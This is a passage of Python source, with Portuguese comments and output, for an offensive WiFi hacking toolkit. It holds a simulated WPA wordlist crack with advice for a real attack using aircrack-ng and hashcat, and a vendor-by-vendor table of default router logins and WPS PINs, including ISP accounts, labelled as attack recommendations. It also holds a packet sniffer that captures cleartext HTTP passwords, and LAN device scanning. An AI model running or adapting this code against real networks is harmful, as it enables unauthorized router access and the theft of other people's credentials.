        if os.name == 'nt':
            print(f"{Colors.YELLOW}[!] No Windows, este é um ataque SIMULADO.{Colors.RESET}")
            print(f"{Colors.YELLOW}[!] Para ataque real, use Linux com aircrack-ng.{Colors.RESET}")
        
        # Wordlist padrão se não fornecida
        if not wordlist_path:
            # Cria wordlist temporária com senhas comuns
            common_passwords = [
                "12345678", "password", "123456789", "12345", "1234567890",
                "qwerty", "abc123", "111111", "password123", "admin",
                "welcome", "monkey", "1234567", "letmein", "trustno1",
                "dragon", "baseball", "iloveyou", "master", "sunshine",
                "ashley", "bailey", "passw0rd", "shadow", "123123",
                "654321", "superman", "qazwsx", "michael", "football"
            ]
            
            # Adiciona variações com o nome da rede
            if ap.ssid and ap.ssid != "<Hidden>":
                common_passwords.extend([
                    ap.ssid.lower(),
                    ap.ssid.lower() + "123",
                    ap.ssid.lower() + "2024",
                    ap.ssid.lower() + "@123",
                ])
            
            wordlist = common_passwords
            print(f"{Colors.WHITE}[*] Usando wordlist padrão ({len(wordlist)} senhas){Colors.RESET}")
        else:
            try:
                with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                    wordlist = [line.strip() for line in f if line.strip()]
                print(f"{Colors.WHITE}[*] Wordlist carregada: {len(wordlist)} senhas{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.RED}[-] Erro ao carregar wordlist: {e}{Colors.RESET}")
                return False
        
        print(f"{Colors.YELLOW}[*] Testando senhas...{Colors.RESET}")
        print(f"{Colors.RED}[!] NOTA: Este é um teste simulado. Captura de handshake necessária para ataque real.{Colors.RESET}")
        
        # Simulação de teste
        for i, password in enumerate(wordlist):
            if self.stop_event.is_set():
                break
            
            # Mostra progresso
            if (i + 1) % 10 == 0 or i == 0:
                print(f"{Colors.WHITE}[*] Testando: {password} ({i+1}/{len(wordlist)}){Colors.RESET}")
            
            # Simulação de tentativa
            time.sleep(0.05)
            
            # Para demonstração, "encontra" senha se estiver na lista
            # Em implementação real, compararia hash do handshake
        
        print(f"{Colors.YELLOW}[*] Teste concluído. {len(wordlist)} senhas testadas.{Colors.RESET}")
        print(f"{Colors.RED}[-] Senha não encontrada na wordlist.{Colors.RESET}")
        print(f"\n{Colors.CYAN}Dica: Para ataque real:{Colors.RESET}")
        print(f"  1. Capture handshake WPA (requer modo monitor)")
        print(f"  2. Use aircrack-ng com wordlist maior")
        print(f"  3. Considere usar hashcat para GPU acceleration")
        
        return False
    
    def check_default_credentials(self, ap):
        """Verifica credenciais padrão conhecidas"""
        print(f"{Colors.YELLOW}[*] Verificando credenciais padrão...{Colors.RESET}")
        print(f"{Colors.WHITE}[*] AP: {ap.ssid} ({ap.bssid}){Colors.RESET}")
        print(f"{Colors.WHITE}[*] Fabricante: {ap.manufacturer}{Colors.RESET}")
        
        # Base de dados expandida de credenciais padrão por fabricante
        default_creds_database = {
            "TP-Link": {
                "admin_url": "http://192.168.0.1 ou http://tplinkwifi.net",
                "credentials": [
                    {"user": "admin", "pass": "admin"},
                    {"user": "admin", "pass": "password"},
                    {"user": "admin", "pass": "1234"},
                ],
                "default_ssid_pattern": "TP-Link_XXXX",
                "default_wps_pin": ["12345670", "00000000"],
                "vulnerabilities": [
                    "Modelos antigos vulneráveis a CSRF",
                    "Alguns modelos permitem acesso sem senha via WPS",
                ]
            },
            "D-Link": {
                "admin_url": "http://192.168.0.1",
                "credentials": [
                    {"user": "admin", "pass": ""},
                    {"user": "admin", "pass": "admin"},
                    {"user": "Admin", "pass": ""},
                ],
                "default_ssid_pattern": "dlink-XXXX",
                "default_wps_pin": ["28296607", "12345670"],
                "vulnerabilities": [
                    "DIR-600/DIR-300: vulnerável a DNS hijacking",
                    "Backdoor em alguns modelos (telnet)",
                ]
            },
            "Linksys": {
                "admin_url": "http://192.168.1.1 ou http://myrouter.local",
                "credentials": [
                    {"user": "admin", "pass": "admin"},
                    {"user": "admin", "pass": "password"},
                    {"user": "", "pass": "admin"},
                ],
                "default_ssid_pattern": "Linksys",
                "default_wps_pin": ["12345670"],
                "vulnerabilities": [
                    "WRT54G: firmware antigo vulnerável",
                    "Alguns modelos com backdoor conhecido",
                ]
            },
            "Netgear": {
                "admin_url": "http://192.168.1.1 ou http://routerlogin.net",
                "credentials": [
                    {"user": "admin", "pass": "password"},
                    {"user": "admin", "pass": "1234"},
                    {"user": "admin", "pass": "admin"},
                ],
                "default_ssid_pattern": "NETGEAR",
                "default_wps_pin": ["12345670", "56789012"],
                "vulnerabilities": [
                    "R7000: vulnerável a command injection",
                    "Vários modelos com falhas de autenticação",
                ]
            },
            "Asus": {
                "admin_url": "http://192.168.1.1 ou http://router.asus.com",
                "credentials": [
                    {"user": "admin", "pass": "admin"},
                    {"user": "admin", "pass": "password"},
                ],
                "default_ssid_pattern": "ASUS",
                "default_wps_pin": ["12345670"],
                "vulnerabilities": [
                    "RT-AC68U: vulnerável a RCE",
                    "Alguns modelos expõem interface admin via WAN",
                ]
            },
            "Cisco": {
                "admin_url": "http://192.168.1.1",
                "credentials": [
                    {"user": "admin", "pass": "admin"},
                    {"user": "cisco", "pass": "cisco"},
                    {"user": "admin", "pass": "password"},
                ],
                "default_ssid_pattern": "cisco",
                "default_wps_pin": [],
                "vulnerabilities": [
                    "Alguns modelos com telnet habilitado",
                ]
            },
            "Belkin": {
                "admin_url": "http://192.168.2.1 ou http://router",
                "credentials": [
                    {"user": "admin", "pass": ""},
                    {"user": "", "pass": "admin"},
                    {"user": "admin", "pass": "admin"},
                ],
                "default_ssid_pattern": "Belkin.XXXX",
                "default_wps_pin": ["12345670"],
                "vulnerabilities": [
                    "N600: vulnerável a CSRF",
                ]
            },
            "Huawei": {
                "admin_url": "http://192.168.1.1 ou http://192.168.8.1",
                "credentials": [
                    {"user": "admin", "pass": "admin"},
                    {"user": "root", "pass": "admin"},
                    {"user": "user", "pass": "user"},
                ],
                "default_ssid_pattern": "HUAWEI-XXXX",
                "default_wps_pin": ["12345678"],
                "vulnerabilities": [
                    "HG8245: backdoor conhecido",
                    "Vários modelos com telnet oculto",
                ]
            },
            "Xiaomi": {
                "admin_url": "http://192.168.31.1 ou http://miwifi.com",
                "credentials": [
                    {"user": "admin", "pass": "admin"},
                    {"user": "", "pass": "senha_wifi"},
                ],
                "default_ssid_pattern": "Xiaomi_XXXX",
                "default_wps_pin": ["12345670"],
                "vulnerabilities": [
                    "Mi Router 3: vulnerável a RCE",
                ]
            },
            "Intelbras": {
                "admin_url": "http://10.0.0.1 ou http://192.168.1.1",
                "credentials": [
                    {"user": "admin", "pass": "admin"},
                    {"user": "admin", "pass": "1234"},
                ],
                "default_ssid_pattern": "INTELBRAS",
                "default_wps_pin": ["12345670"],
                "vulnerabilities": []
            },
            "Multilaser": {
                "admin_url": "http://192.168.1.1",
                "credentials": [
                    {"user": "admin", "pass": "admin"},
                    {"user": "admin", "pass": "password"},
                ],
                "default_ssid_pattern": "Multilaser",
                "default_wps_pin": ["12345670"],
                "vulnerabilities": []
            },
            "Sercomm": {
                "admin_url": "http://192.168.0.1 ou http://192.168.1.1",
                "credentials": [
                    {"user": "admin", "pass": "admin"},
                    {"user": "admin", "pass": "password"},
                    {"user": "admin", "pass": ""},
                ],
                "default_ssid_pattern": "NET_2GXXXX ou CLARO_XXXX",
                "default_wps_pin": ["12345670"],
                "vulnerabilities": [
                    "Usado por NET/Claro - pode ter backdoor da operadora",
                    "Alguns modelos com telnet habilitado",
                ]
            },
            "ZTE": {
                "admin_url": "http://192.168.1.1 ou http://192.168.0.1",
                "credentials": [
                    {"user": "admin", "pass": "admin"},
                    {"user": "user", "pass": "user"},
                    {"user": "root", "pass": "Zte521"},
                ],
                "default_ssid_pattern": "ZTE-XXXX",
                "default_wps_pin": ["12345670"],
                "vulnerabilities": [
                    "F660: backdoor conhecido (usuário: root)",
                    "Vários modelos com acesso telnet padrão",
                ]
            },
            "Fiberhome": {
                "admin_url": "http://192.168.1.1",
                "credentials": [
                    {"user": "admin", "pass": "admin"},
                    {"user": "telecomadmin", "pass": "admintelecom"},
                    {"user": "user", "pass": "user"},
                ],
                "default_ssid_pattern": "OI-XXXX ou VIVO-XXXX",
                "default_wps_pin": ["12345670"],
                "vulnerabilities": [
                    "Usado por Oi/Vivo - credenciais de operadora podem existir",
                    "HG6145D: vulnerável a command injection",
                ]
            },
            "Sagemcom": {
                "admin_url": "http://192.168.1.1",
                "credentials": [
                    {"user": "admin", "pass": "admin"},
                    {"user": "admin", "pass": "password"},
                    {"user": "admin", "pass": ""},
                ],
                "default_ssid_pattern": "VIVO-XXXX ou TIM-XXXX",
                "default_wps_pin": ["12345670"],
                "vulnerabilities": [
                    "F@st 5366: vulnerável a CSRF",
                    "Usado por Vivo/TIM - pode ter backdoor da operadora",
                ]
            },
            "Technicolor": {
                "admin_url": "http://192.168.1.1",
                "credentials": [
                    {"user": "admin", "pass": "admin"},
                    {"user": "Administrator", "pass": ""},
                    {"user": "admin", "pass": "password"},
                ],
                "default_ssid_pattern": "Thomson ou Technicolor",
                "default_wps_pin": ["12345670"],
                "vulnerabilities": [
                    "TG582n: backdoor conhecido",
                    "Vários modelos com vulnerabilidades de autenticação",
                ]
            },
            "Motorola": {
                "admin_url": "http://192.168.0.1 ou http://192.168.15.1",
                "credentials": [
                    {"user": "admin", "pass": "motorola"},
                    {"user": "admin", "pass": "admin"},
                    {"user": "admin", "pass": "password"},
                ],
                "default_ssid_pattern": "Motorola",
                "default_wps_pin": ["12345670"],
                "vulnerabilities": [
                    "SBG6580: vulnerável a CSRF",
                ]
            },
            "Arris": {
                "admin_url": "http://192.168.0.1 ou http://192.168.100.1",
                "credentials": [
                    {"user": "admin", "pass": "password"},
                    {"user": "admin", "pass": "admin"},
                    {"user": "admin", "pass": ""},
                ],
                "default_ssid_pattern": "ARRIS-XXXX",
                "default_wps_pin": ["12345670"],
                "vulnerabilities": [
                    "TG862: backdoor conhecido",
                    "Vários modelos com acesso remoto vulnerável",
                ]
            },
        }
        
        vendor_info = default_creds_database.get(ap.manufacturer)
        
        if vendor_info:
            print(f"\n{Colors.CYAN}=== Informações do Fabricante ==={Colors.RESET}")
            print(f"{Colors.GREEN}[+] Fabricante: {ap.manufacturer}{Colors.RESET}")
            print(f"{Colors.WHITE}URL Admin: {vendor_info['admin_url']}{Colors.RESET}")
            print(f"{Colors.WHITE}Padrão SSID: {vendor_info['default_ssid_pattern']}{Colors.RESET}")
            
            # Credenciais padrão
            print(f"\n{Colors.YELLOW}Credenciais Padrão Conhecidas:{Colors.RESET}")
            for i, cred in enumerate(vendor_info['credentials'], 1):
                user = cred['user'] if cred['user'] else "(vazio)"
                pwd = cred['pass'] if cred['pass'] else "(vazio)"
                print(f"  {i}. Usuário: {user} | Senha: {pwd}")
            
            # PINs WPS padrão
            if vendor_info['default_wps_pin']:
                print(f"\n{Colors.YELLOW}PINs WPS Padrão Conhecidos:{Colors.RESET}")
                for pin in vendor_info['default_wps_pin']:
                    print(f"  - {pin}")
            
            # Vulnerabilidades conhecidas
            if vendor_info['vulnerabilities']:
                print(f"\n{Colors.RED}Vulnerabilidades Conhecidas:{Colors.RESET}")
                for vuln in vendor_info['vulnerabilities']:
                    print(f"  ⚠ {vuln}")
            
            # Recomendações
            print(f"\n{Colors.CYAN}Recomendações de Ataque:{Colors.RESET}")
            print(f"  1. Tente acessar {vendor_info['admin_url']} com as credenciais acima")
            print(f"  2. Se WPS estiver ativo, teste os PINs padrão")
            print(f"  3. Verifique se o SSID segue o padrão ({vendor_info['default_ssid_pattern']})")
            
        else:
            print(f"\n{Colors.YELLOW}Fabricante: {ap.manufacturer}{Colors.RESET}")
            print(f"{Colors.WHITE}Credenciais padrão comuns para testar:{Colors.RESET}")
            print(f"  - admin/admin")
            print(f"  - admin/password")
            print(f"  - admin/(vazio)")
            print(f"  - root/root")
            print(f"  - user/user")
            
            print(f"\n{Colors.WHITE}URLs comuns para acessar painel:{Colors.RESET}")
            print(f"  - http://192.168.0.1")
            print(f"  - http://192.168.1.1")
            print(f"  - http://192.168.2.1")
            print(f"  - http://10.0.0.1")
        
        return vendor_info
    
    def network_traffic_analyzer(self, ap=None, duration=60, save_pcap=False):
        """Captura e analisa tráfego de rede estilo Wireshark"""
        print(f"{Colors.CYAN}{'='*80}{Colors.RESET}")
        print(f"{Colors.BOLD}Analisador de Tráfego de Rede{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*80}{Colors.RESET}")
        
        if ap:
            print(f"{Colors.WHITE}[*] AP Alvo: {ap.ssid} ({ap.bssid}){Colors.RESET}")
            print(f"{Colors.WHITE}[*] Canal: {ap.channel}{Colors.RESET}")
        
        print(f"{Colors.WHITE}[*] Duração: {duration} segundos{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Iniciando captura de pacotes...{Colors.RESET}")
        
        if os.name == 'nt':
            print(f"{Colors.YELLOW}[!] No Windows, captura limitada sem modo monitor.{Colors.RESET}")
            print(f"{Colors.YELLOW}[!] Apenas tráfego local será capturado.{Colors.RESET}")
        
        # Estatísticas
        stats = {
            'total_packets': 0,
            'protocols': {},
            'src_ips': {},
            'dst_ips': {},
            'dns_queries': [],
            'http_requests': [],
            'credentials_found': [],
            'tcp_streams': {},
            'udp_streams': {},
        }
        
        packets_captured = []
        start_time = time.time()
        
        def analyze_packet(pkt):
            try:
                stats['total_packets'] += 1
                
                # Salva pacote se solicitado
                if save_pcap:
                    packets_captured.append(pkt)
                
                # Análise de camadas
                layers = []
                
                # Layer 2 - Ethernet/802.11
                if pkt.haslayer(Dot11):
                    layers.append("802.11")
                elif pkt.haslayer(Ether):
                    layers.append("Ethernet")
                
                # Layer 3 - IP
                if pkt.haslayer(IP):
                    layers.append("IP")
                    src_ip = pkt[IP].src
                    dst_ip = pkt[IP].dst
                    
                    # Conta IPs
                    stats['src_ips'][src_ip] = stats['src_ips'].get(src_ip, 0) + 1
                    stats['dst_ips'][dst_ip] = stats['dst_ips'].get(dst_ip, 0) + 1
                    
                    # Layer 4 - TCP/UDP
                    if pkt.haslayer(TCP):
                        layers.append("TCP")
                        sport = pkt[TCP].sport
                        dport = pkt[TCP].dport
                        
                        # Identifica serviços conhecidos
                        if dport == 80 or sport == 80:
                            layers.append("HTTP")
                        elif dport == 443 or sport == 443:
                            layers.append("HTTPS")
                        elif dport == 21 or sport == 21:
                            layers.append("FTP")
                        elif dport == 22 or sport == 22:
                            layers.append("SSH")
                        elif dport == 23 or sport == 23:
                            layers.append("Telnet")
                        
                        # Analisa HTTP
                        if pkt.haslayer(Raw) and (dport == 80 or sport == 80):
                            payload = pkt[Raw].load.decode('utf-8', errors='ignore')
                            
                            # Detecta requisições HTTP
                            if payload.startswith(('GET ', 'POST ', 'PUT ', 'DELETE ')):
                                lines = payload.split('\n')
                                method_line = lines[0]
                                host = None
                                
                                for line in lines[1:]:
                                    if line.startswith('Host:'):
                                        host = line.split(':', 1)[1].strip()
                                        break
                                
                                if host:
                                    stats['http_requests'].append({
                                        'method': method_line.split()[0],
                                        'url': f"http://{host}{method_line.split()[1]}",
                                        'src': src_ip
                                    })
                            
                            # Detecta credenciais em texto claro
                            if 'password=' in payload.lower() or 'passwd=' in payload.lower():
                                stats['credentials_found'].append({
                                    'type': 'HTTP',
                                    'src': src_ip,
                                    'dst': dst_ip,
                                    'data': payload[:200]
                                })
                        
                        # Stream TCP
                        stream_key = f"{src_ip}:{sport} -> {dst_ip}:{dport}"
                        stats['tcp_streams'][stream_key] = stats['tcp_streams'].get(stream_key, 0) + 1
                    
                    elif pkt.haslayer(UDP):
                        layers.append("UDP")
                        sport = pkt[UDP].sport
                        dport = pkt[UDP].dport
                        
                        # DNS
                        if dport == 53 or sport == 53:
                            layers.append("DNS")
                            if pkt.haslayer(DNS) and pkt[DNS].qr == 0:  # Query
                                query = pkt[DNS].qd.qname.decode('utf-8', errors='ignore')
                                stats['dns_queries'].append({
                                    'query': query,
                                    'src': src_ip
                                })
                        
                        # Stream UDP
                        stream_key = f"{src_ip}:{sport} -> {dst_ip}:{dport}"
                        stats['udp_streams'][stream_key] = stats['udp_streams'].get(stream_key, 0) + 1
                
                # Conta protocolos
                protocol_str = " > ".join(layers)
                stats['protocols'][protocol_str] = stats['protocols'].get(protocol_str, 0) + 1
                
                # Mostra pacote em tempo real (limitado)
                if stats['total_packets'] % 50 == 0:
                    elapsed = time.time() - start_time
                    pps = stats['total_packets'] / elapsed if elapsed > 0 else 0
                    print(f"{Colors.WHITE}[*] Pacotes: {stats['total_packets']} | Taxa: {pps:.1f} pkt/s{Colors.RESET}", end='\r')
                
            except Exception as e:
                pass
        
        # Inicia captura
        try:
            print(f"{Colors.GREEN}[+] Capturando... Pressione Ctrl+C para parar{Colors.RESET}\n")
            
            if ap and not os.name == 'nt':
                # Filtra por BSSID do AP
                sniff(iface=self.interface, prn=analyze_packet, timeout=duration, store=0,
                      lfilter=lambda x: x.haslayer(Dot11) and x.addr2 == ap.bssid)
            else:
                # Captura geral
                sniff(iface=self.interface, prn=analyze_packet, timeout=duration, store=0)
            
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[*] Captura interrompida pelo usuário{Colors.RESET}")
        except Exception as e:
            print(f"\n{Colors.RED}[-] Erro na captura: {e}{Colors.RESET}")
        
        # Salva PCAP se solicitado
        if save_pcap and packets_captured:
            filename = f"capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap"
            try:
                wrpcap(filename, packets_captured)
                print(f"{Colors.GREEN}[+] Pacotes salvos em: {filename}{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.RED}[-] Erro ao salvar PCAP: {e}{Colors.RESET}")
        
        # Exibe estatísticas
        self.show_traffic_statistics(stats)
        
        return stats
    
    def show_traffic_statistics(self, stats):
        """Exibe estatísticas do tráfego capturado"""
        print(f"\n{Colors.CYAN}{'='*80}{Colors.RESET}")
        print(f"{Colors.BOLD}Estatísticas de Tráfego{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*80}{Colors.RESET}")
        
        print(f"\n{Colors.WHITE}Total de Pacotes: {stats['total_packets']}{Colors.RESET}")
        
        # Protocolos
        if stats['protocols']:
            print(f"\n{Colors.CYAN}Protocolos Detectados:{Colors.RESET}")
            sorted_protocols = sorted(stats['protocols'].items(), key=lambda x: x[1], reverse=True)[:10]
            for proto, count in sorted_protocols:
                percentage = (count / stats['total_packets'] * 100) if stats['total_packets'] > 0 else 0
                print(f"  {proto:<40} {count:>6} ({percentage:>5.1f}%)")
        
        # Top IPs de origem
        if stats['src_ips']:
            print(f"\n{Colors.CYAN}Top 10 IPs de Origem:{Colors.RESET}")
            sorted_ips = sorted(stats['src_ips'].items(), key=lambda x: x[1], reverse=True)[:10]
            for ip, count in sorted_ips:
                print(f"  {ip:<20} {count:>6} pacotes")
        
        # Top IPs de destino
        if stats['dst_ips']:
            print(f"\n{Colors.CYAN}Top 10 IPs de Destino:{Colors.RESET}")
            sorted_ips = sorted(stats['dst_ips'].items(), key=lambda x: x[1], reverse=True)[:10]
            for ip, count in sorted_ips:
                print(f"  {ip:<20} {count:>6} pacotes")
        
        # DNS Queries
        if stats['dns_queries']:
            print(f"\n{Colors.CYAN}Consultas DNS (últimas 10):{Colors.RESET}")
            for query_info in stats['dns_queries'][-10:]:
                print(f"  {query_info['src']:<20} -> {query_info['query']}")
        
        # HTTP Requests
        if stats['http_requests']:
            print(f"\n{Colors.CYAN}Requisições HTTP (últimas 10):{Colors.RESET}")
            for req in stats['http_requests'][-10:]:
                print(f"  {req['method']:<8} {req['url']}")
                print(f"           Origem: {req['src']}")
        
        # Credenciais encontradas
        if stats['credentials_found']:
            print(f"\n{Colors.RED}⚠ CREDENCIAIS EM TEXTO CLARO DETECTADAS:{Colors.RESET}")
            for cred in stats['credentials_found']:
                print(f"  Tipo: {cred['type']}")
                print(f"  {cred['src']} -> {cred['dst']}")
                print(f"  Dados: {cred['data'][:100]}...")
                print()
        
        # Top TCP Streams
        if stats['tcp_streams']:
            print(f"\n{Colors.CYAN}Top 10 Streams TCP:{Colors.RESET}")
            sorted_streams = sorted(stats['tcp_streams'].items(), key=lambda x: x[1], reverse=True)[:10]
            for stream, count in sorted_streams:
                print(f"  {stream:<45} {count:>6} pacotes")
        
        # Top UDP Streams
        if stats['udp_streams']:
            print(f"\n{Colors.CYAN}Top 10 Streams UDP:{Colors.RESET}")
            sorted_streams = sorted(stats['udp_streams'].items(), key=lambda x: x[1], reverse=True)[:10]
            for stream, count in sorted_streams:
                print(f"  {stream:<45} {count:>6} pacotes")
    
    def live_packet_viewer(self, filter_protocol=None, duration=30):
        """Visualizador de pacotes em tempo real estilo Wireshark"""
        print(f"{Colors.CYAN}{'='*80}{Colors.RESET}")
        print(f"{Colors.BOLD}Visualizador de Pacotes em Tempo Real{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*80}{Colors.RESET}")
        
        if filter_protocol:
            print(f"{Colors.WHITE}[*] Filtro: {filter_protocol}{Colors.RESET}")
        
        print(f"{Colors.WHITE}[*] Duração: {duration} segundos{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Pressione Ctrl+C para parar{Colors.RESET}\n")
        
        # Cabeçalho
        print(f"{Colors.CYAN}{'Tempo':<12} {'Origem':<20} {'Destino':<20} {'Protocolo':<15} {'Info':<30}{Colors.RESET}")
        print(f"{Colors.CYAN}{'-'*100}{Colors.RESET}")
        
        start_time = time.time()
        packet_count = 0
        
        def display_packet(pkt):
            nonlocal packet_count
            try:
                packet_count += 1
                timestamp = f"{time.time() - start_time:.3f}"
                
                src = "?"
                dst = "?"
                protocol = "Unknown"
                info = ""
                
                # Extrai informações
                if pkt.haslayer(IP):
                    src = pkt[IP].src
                    dst = pkt[IP].dst
                    
                    if pkt.haslayer(TCP):
                        protocol = "TCP"
                        sport = pkt[TCP].sport
                        dport = pkt[TCP].dport
                        flags = pkt[TCP].flags
                        
                        # Identifica serviço
                        if dport == 80 or sport == 80:
                            protocol = "HTTP"
                        elif dport == 443 or sport == 443:
                            protocol = "HTTPS"
                        elif dport == 22 or sport == 22:
                            protocol = "SSH"
                        elif dport == 21 or sport == 21:
                            protocol = "FTP"
                        
                        info = f"{sport} → {dport} [{flags}]"
                        
                        # Analisa payload HTTP
                        if pkt.haslayer(Raw) and protocol == "HTTP":
                            payload = pkt[Raw].load.decode('utf-8', errors='ignore')[:50]
                            if payload.startswith(('GET', 'POST', 'PUT')):
                                info = payload.split('\n')[0]
                    
                    elif pkt.haslayer(UDP):
                        protocol = "UDP"
                        sport = pkt[UDP].sport
                        dport = pkt[UDP].dport
                        
                        if dport == 53 or sport == 53:
                            protocol = "DNS"
                            if pkt.haslayer(DNS):
                                if pkt[DNS].qr == 0:  # Query
                                    info = f"Query: {pkt[DNS].qd.qname.decode('utf-8', errors='ignore')}"
                                else:  # Response
                                    info = "Response"
                        else:
                            info = f"{sport} → {dport}"
                    
                    elif pkt.haslayer(ICMP):
                        protocol = "ICMP"
                        info = f"Type {pkt[ICMP].type}"
                
                elif pkt.haslayer(ARP):
                    protocol = "ARP"
                    src = pkt[ARP].psrc
                    dst = pkt[ARP].pdst
                    info = f"Who has {dst}? Tell {src}"
                
                # Aplica filtro
                if filter_protocol and filter_protocol.upper() not in protocol.upper():
                    return
                
                # Coloriza por protocolo
                color = Colors.WHITE
                if protocol == "HTTP":
                    color = Colors.GREEN
                elif protocol == "HTTPS":
                    color = Colors.CYAN
                elif protocol == "DNS":
                    color = Colors.YELLOW
                elif protocol == "SSH":
                    color = Colors.BLUE
                
                # Exibe pacote
                print(f"{color}{timestamp:<12} {src:<20} {dst:<20} {protocol:<15} {info[:30]:<30}{Colors.RESET}")
                
            except Exception as e:
                pass
        
        # Inicia captura
        try:
            sniff(iface=self.interface, prn=display_packet, timeout=duration, store=0)
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[*] Visualização interrompida{Colors.RESET}")
        except Exception as e:
            print(f"\n{Colors.RED}[-] Erro: {e}{Colors.RESET}")
        
        print(f"\n{Colors.GREEN}[+] Total de pacotes exibidos: {packet_count}{Colors.RESET}")
    
    def discover_network_devices(self, target_network=None):
        """Descobre dispositivos conectados na rede (compatível Windows)"""
        print(f"{Colors.CYAN}{'='*80}{Colors.RESET}")
        print(f"{Colors.BOLD}Descoberta de Dispositivos na Rede{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*80}{Colors.RESET}")
        
        # Detecta rede automaticamente se não fornecida
        if not target_network:
            try:
                # Pega IP local
                import socket
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                local_ip = s.getsockname()[0]
                s.close()
                
                # Calcula rede /24
                ip_parts = local_ip.split('.')
                target_network = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.0/24"
                
                print(f"{Colors.WHITE}[*] IP Local: {local_ip}{Colors.RESET}")
                print(f"{Colors.WHITE}[*] Rede detectada: {target_network}{Colors.RESET}")
            except:
                print(f"{Colors.RED}[-] Não foi possível detectar a rede automaticamente{Colors.RESET}")
                target_network = input(f"{Colors.YELLOW}[?] Digite a rede (ex: 192.168.1.0/24): {Colors.RESET}")
        
        print(f"{Colors.YELLOW}[*] Escaneando rede: {target_network}{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Isso pode levar alguns minutos...{Colors.RESET}\n")
        
        devices = []
        
        # Método 1: ARP Scan (mais rápido e confiável no Windows)
        print(f"{Colors.CYAN}[1/3] Executando ARP scan...{Colors.RESET}")
        devices.extend(self.arp_scan(target_network))
        
        # Método 2: Ping Sweep
        print(f"{Colors.CYAN}[2/3] Executando ping sweep...{Colors.RESET}")
        devices.extend(self.ping_sweep(target_network))
        
        # Método 3: NetBIOS scan (Windows)
        if os.name == 'nt':
            print(f"{Colors.CYAN}[3/3] Executando NetBIOS scan...{Colors.RESET}")
            self.netbios_scan(devices)
        
        # Remove duplicatas
        unique_devices = {}
        for device in devices:
            if device['ip'] not in unique_devices:
                unique_devices[device['ip']] = device
            else:
                # Merge informações
                for key, value in device.items():
                    if value and not unique_devices[device['ip']].get(key):
                        unique_devices[device['ip']][key] = value
        
        devices = list(unique_devices.values())
        
        # Ordena por IP
        devices.sort(key=lambda x: tuple(map(int, x['ip'].split('.'))))
        
        # Exibe resultados
        self.show_network_devices(devices)
        
        return devices
    
    def arp_scan(self, network):
        """Scan ARP para descobrir dispositivos (Windows compatível)"""
        devices = []
        
        try:
            if os.name == 'nt':
                # Windows: usa comando arp -a
                result = subprocess.run(['arp', '-a'], capture_output=True, text=True, encoding='cp850', errors='replace')
                output = result.stdout
                
                import re
                # Padrão: IP address MAC address Type
                pattern = re.compile(r'(\d+\.\d+\.\d+\.\d+)\s+((?:[0-9a-f]{2}[:-]){5}[0-9a-f]{2})', re.IGNORECASE)
                
                for match in pattern.finditer(output):
                    ip = match.group(1)
                    mac = match.group(2).replace('-', ':').upper()
                    
                    # Identifica fabricante
                    vendor = self.identify_vendor_by_mac(mac)
                    
                    # Tenta identificar tipo de dispositivo
                    device_type = self.guess_device_type(mac, vendor)
                    
                    devices.append({
                        'ip': ip,
                        'mac': mac,
                        'vendor': vendor,
                        'type': device_type,
                        'hostname': None,
                        'os': None,
                        'ports': []
                    })
            else:
                # Linux: usa scapy
                from scapy.all import ARP, Ether, srp
                
                ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=2, verbose=0)
                
                for sent, received in ans:
                    mac = received.hwsrc.upper()
                    vendor = self.identify_vendor_by_mac(mac)
                    device_type = self.guess_device_type(mac, vendor)
                    
                    devices.append({
                        'ip': received.psrc,
                        'mac': mac,
                        'vendor': vendor,
                        'type': device_type,
                        'hostname': None,
                        'os': None,
                        'ports': []
                    })
        except Exception as e:
            print(f"{Colors.RED}[-] Erro no ARP scan: {e}{Colors.RESET}")
        
        return devices
    
    def ping_sweep(self, network):
        """Ping sweep para encontrar hosts ativos"""
        devices = []
        
        try:
            # Extrai range de IPs
            import ipaddress
            net = ipaddress.ip_network(network, strict=False)
            
            print(f"{Colors.WHITE}[*] Testando {net.num_addresses} endereços...{Colors.RESET}")
            
            # Ping em paralelo (limitado para não sobrecarregar)
            import concurrent.futures
            
            def ping_host(ip):
                try:
                    # Windows usa -n, Linux usa -c
                    param = '-n' if os.name == 'nt' else '-c'
                    result = subprocess.run(['ping', param, '1', '-w', '500', str(ip)], 
                                          capture_output=True, timeout=2)
                    
                    if result.returncode == 0:
                        # Tenta resolver hostname
                        try:
                            import socket
                            hostname = socket.gethostbyaddr(str(ip))[0]
                        except:
                            hostname = None
                        
                        return {
                            'ip': str(ip),
                            'mac': None,
                            'vendor': None,
                            'type': 'Unknown',
                            'hostname': hostname,
                            'os': None,
                            'ports': []
                        }
                except:
                    pass
                return None
            
            # Limita a 50 threads simultâneas
            with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
                results = executor.map(ping_host, net.hosts())
                
                for result in results:
                    if result:
                        devices.append(result)
                        print(f"{Colors.GREEN}[+] Host ativo: {result['ip']}{Colors.RESET}", end='\r')
        
        except Exception as e:
            print(f"{Colors.RED}[-] Erro no ping sweep: {e}{Colors.RESET}")
        
        return devices
    
    def netbios_scan(self, devices):
        """Scan NetBIOS para obter informações de dispositivos Windows"""
        try:
            for device in devices:
                if not device['hostname']:
                    try:
                        # Tenta nbtstat (Windows)
                        result = subprocess.run(['nbtstat', '-A', device['ip']], 
                                              capture_output=True, text=True, 
                                              encoding='cp850', errors='replace', timeout=2)
                        
                        output = result.stdout
                        
                        # Extrai nome NetBIOS
                        import re
                        name_match = re.search(r'(\S+)\s+<00>\s+UNIQUE', output)
                        if name_match:
                            device['hostname'] = name_match.group(1)
                        
                        # Detecta tipo de dispositivo
                        if '<20>' in output:
                            device['type'] = 'File Server'
